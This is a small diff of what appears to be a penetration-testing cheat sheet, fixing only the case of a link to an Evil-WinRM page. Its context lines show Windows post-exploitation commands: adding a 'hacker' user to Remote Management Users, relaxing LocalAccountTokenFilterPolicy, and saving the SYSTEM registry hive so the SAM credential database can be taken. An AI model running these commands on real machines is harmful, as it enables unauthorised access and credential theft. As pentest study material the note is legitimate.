@@ -16,7 +16,7 @@ net localgroup "Remote Management Users" hacker /add # Same as the above but can
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 ```
 
-With Evil-WinRm (see [[Evil-winrm-Cheatsheet]]) we can backup SAM and SYSTEM files and dowload them 
+With Evil-WinRm (see [[evil-winrm-Cheatsheet]]) we can backup SAM and SYSTEM files and dowload them 
 
 ```powershell
 reg save hklm\system system.bak
